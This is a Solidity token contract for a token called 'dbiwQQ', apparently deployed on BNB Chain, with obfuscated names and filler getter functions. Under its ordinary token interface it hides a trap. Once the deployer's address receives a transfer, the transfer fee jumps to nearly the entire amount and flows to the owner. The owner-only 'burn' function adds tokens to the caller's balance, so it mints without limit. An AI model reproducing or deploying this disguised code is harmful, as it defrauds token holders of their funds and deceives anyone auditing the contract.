/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.7.0;
contract HQtwsTqx {
address private  JuWkvZ = address(0);
string public  symbol = "dbiwQQ";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
uint256 private  AVfmgK = 1000000000000000000000;
address private  vVVqlq = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address private  JwIOyS = address(0);
uint256 private  dNlJiU = 1000000000000000000;
uint256 private  iYbsgk = 10000000000;
uint256 private  EWoVfk = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public owner;
address private  XGXTzp = address(0);
uint256 public constant rWjWcC = 99999;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  DfHwMg = address(0);
address private  Urvmus = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  EnxyUN = 1000000000000000;
string public  name = "dbiwQQ";
address private  cZgVMn = address(0);
address private  hOmxQh = address(0);
address private  XWGJPe = address(0);
uint256 private  LoZbCH = 100000000;
uint256 private  hCFJkn = 10000000000000;
function _getEnxyUN() private returns (uint256) {
return EnxyUN;
}







function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


function _getUrvmus() private returns (address) {
return Urvmus;
}



function _getAVfmgK() private returns (uint256) {
return AVfmgK;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getXGXTzp() private returns (address) {
return XGXTzp;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _gethOmxQh() private returns (address) {
return hOmxQh;
}

function _getcZgVMn() private returns (address) {
return cZgVMn;
}

function _getEWoVfk() private returns (uint256) {
return EWoVfk;
}

function _getDfHwMg() private returns (address) {
return DfHwMg;
}



function _getJwIOyS() private returns (address) {
return JwIOyS;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tOqNqdk 0");
require(spender != address(0), "fOqNqdk 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "OqNqdk");
require(to != address(0), "OqNqdk");
require(amount <= balanceOf[from], "OqNqdk");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* rWjWcC/dNlJiU ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==vVVqlq){
dNlJiU = rWjWcC+2;
}
emit Transfer(from, to, transferAmount);
}
function _getXWGJPe() private returns (address) {
return XWGJPe;
}





function _gethCFJkn() private returns (uint256) {
return hCFJkn;
}

function _getiYbsgk() private returns (uint256) {
return iYbsgk;
}





constructor () {
vVVqlq = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getLoZbCH() private returns (uint256) {
return LoZbCH;
}



function _getJuWkvZ() private returns (address) {
return JuWkvZ;
}



function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}




function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}



}